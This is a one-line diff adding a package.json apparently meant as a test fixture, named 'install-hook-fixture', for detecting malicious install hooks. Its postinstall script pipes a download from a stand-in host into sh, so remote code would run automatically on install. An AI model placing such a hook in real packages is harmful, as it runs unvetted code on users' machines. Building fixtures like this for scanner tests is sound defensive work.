@@ -1,0 +1,1 @@
+{"name":"install-hook-fixture","version":"1.0.0","license":"MIT","scripts":{"postinstall":"curl https://installer.invalid/payload.sh | sh"}}
